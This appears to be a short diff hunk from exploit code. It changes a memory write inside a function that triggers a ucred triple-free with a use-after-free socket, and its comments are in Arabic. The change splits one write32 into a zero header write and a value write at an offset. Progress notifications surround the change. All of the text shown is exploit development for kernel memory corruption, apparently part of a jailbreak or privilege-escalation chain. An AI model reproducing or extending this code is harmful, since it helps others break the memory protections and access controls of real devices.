@@ -1513,7 +1513,8 @@ function trigger_ucred_triplefree() {
 
     // قبل الكتابة
     send_notification("[T] before_write32_clear");
-    write32(nc_clear_buf, uaf_socket);
+    write32(nc_clear_buf, 0);            // header / reserved
+    write32(nc_clear_buf + 4, uaf_socket);  // actual value
     send_notification("[T] after_write32_clear");
 
     // قبل nc_call
